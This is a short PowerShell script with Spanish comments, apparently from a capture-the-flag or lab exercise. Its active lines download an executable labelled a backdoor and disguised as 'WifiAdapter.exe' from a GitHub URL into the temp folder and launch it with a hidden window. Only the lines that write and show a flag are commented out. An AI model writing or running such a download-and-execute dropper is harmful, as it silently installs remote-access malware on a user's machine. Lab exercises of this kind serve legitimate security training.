# 1) Descargar el backdoor
$dest = "$env:TEMP\WifiAdapter.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/WifiAdapter.exe" `
                  -OutFile $dest

# 2) Ejecutar WifiAdapter.exe desde %TEMP% (oculto)
Start-Process -FilePath $dest -WindowStyle Hidden

# 3) Crear un TXT con la flag y abrirlo en el Bloc de notas
# $flagPath = Join-Path $env:TEMP 'flag_ctf.txt'
# "Fin experimento, flag descubierta ctf{alm0st_a_b4ckd00r}" | Out-File -FilePath $flagPath -Encoding UTF8

# Start-Process -FilePath "notepad.exe" -ArgumentList "`"$flagPath`""
